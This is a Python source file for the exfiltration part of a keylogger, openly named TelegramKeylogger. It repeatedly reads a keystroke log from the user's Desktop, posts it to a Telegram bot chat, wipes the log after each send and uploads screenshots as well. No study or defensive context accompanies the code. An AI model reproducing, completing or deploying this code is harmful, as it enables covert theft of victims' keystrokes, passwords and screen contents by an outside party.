import io
import os
import time
import requests
import getpass
from dotenv import load_dotenv

load_dotenv()

username = getpass.getuser()

class TelegramKeylogger:
    def __init__(self):
        self.bot_token = os.getenv('BOT_TOKEN')
        self.chat_id = os.getenv('CHAT_ID')
        self.send_interval = int(os.getenv('SEND_INTERVAL', 20))
        self.is_running = True
        self.last_send_time = time.time()

    def send_to_telegram(self):
        try:
            if not os.path.exists(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt') or os.path.getsize(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt') == 0:
                return False

            with open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', "r", encoding="utf-8") as f:
                log_content = f.read()

            if not log_content.strip():
                return False

            message = f"Keylogger Report ({time.strftime('%H:%M:%S')}):\n```\n{log_content}\n```"

            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown'
            }

            response = requests.post(url, data=payload, timeout=30)

            if response.status_code == 200:
                open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'w').close()
                return True
            else:
                print(f"Telegram API error: {response.status_code}")
                return False

        except Exception as e:
            print(f"Send error: {e}")
            return False

    def _send_photo(self, image_data):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"

        caption = f"Screenshot ({time.strftime('%H:%M:%S')})"

        files = {'photo': ('screenshot.png', image_data, 'image/png')}
        data = {'chat_id': self.chat_id, 'caption': caption}

        response = requests.post(url, files=files, data=data, timeout=30)

        if response.status_code == 200:
            return True
        else:
            print(f"Telegram photo error: {response.status_code}")
            return False

    def send_screenshot(self, screenshot_image):
        try:
            img_byte_arr = io.BytesIO()
            screenshot_image.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)

            return self._send_photo(img_byte_arr)
        except Exception as e:
            print(f"Screenshot send error: {e}")
            return False

    def auto_send_loop(self):
        while self.is_running:
            try:
                current_time = time.time()
                if current_time - self.last_send_time >= self.send_interval:
                    print(f"[{time.strftime('%H:%M:%S')}] Sending logs")
                    success = self.send_to_telegram()

                    if success:
                        print(f"[{time.strftime('%H:%M:%S')}] Logs sent successfully")
                    else:
                        print(f"[{time.strftime('%H:%M:%S')}] Failed to send logs")

                    self.last_send_time = current_time

                time.sleep(30)

            except Exception as e:
                print(f"Auto-send loop error: {e}")
                time.sleep(60)

    def stop(self):
        self.is_running = False
        print("Stop")
        self.send_to_telegram()